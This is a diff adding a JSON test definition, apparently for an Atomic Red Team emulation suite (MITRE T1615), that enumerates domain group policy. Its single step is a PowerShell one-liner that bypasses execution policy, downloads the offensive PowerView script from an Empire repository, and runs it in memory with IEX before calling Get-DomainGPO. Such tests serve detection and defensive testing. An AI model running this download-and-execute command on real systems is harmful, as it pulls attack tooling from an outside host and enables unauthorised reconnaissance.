@@ -1,0 +1,23 @@
+{
+  "id": "4e524c4e-0e02-49aa-8df5-93f3f7959b9f",
+  "name": "Get-DomainGPO to display group policy information via PowerView",
+  "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4683a289-c169-4b8e-8ca1-e8d5aa428079",
+      "type": "execute-command",
+      "data": {
+        "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1615",
+    "atomic-red-team"
+  ]
+}
